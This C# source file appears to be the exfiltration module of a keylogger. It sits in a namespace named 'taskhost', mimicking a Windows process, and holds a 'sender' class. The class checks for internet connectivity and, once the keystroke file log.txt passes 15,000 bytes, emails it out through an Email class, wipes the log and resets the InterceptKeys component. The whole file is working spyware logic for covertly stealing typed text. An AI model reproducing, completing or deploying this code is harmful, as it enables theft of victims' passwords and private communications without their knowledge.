using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Net;
using System.Net.Mail;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace taskhost
{
    class sender
    {
        [DllImport("wininet.dll")]
        private extern static Boolean InternetGetConnectedState(out int Description, int ReservedValue);

        public void Sender()
        {
            Email envio = new Email();

            if (VerificarConexao())
            {
                if (tamanho())
                {
                    envio.enviar();
                    deleta();
                    InterceptKeys.DataInicialDeArquivo();
                }
            }
        }

        public static Boolean VerificarConexao()
        {
            int Description;
            return InternetGetConnectedState(out Description, 0);
        }
        public static Boolean tamanho()
        {
            FileInfo fileInfo = new FileInfo(@"log.txt");
            long tamanho = fileInfo.Length;
            if (tamanho >= 15000)
                return true;
            else
                return false;

        }

        public static void deleta()
        {
            FileInfo fileInfo = new FileInfo(@"log.txt");
            long tamanho = fileInfo.Length;
            File.WriteAllText(@"log.txt", " ");         //Deleta o arquivo log.txt
        }
    }
}
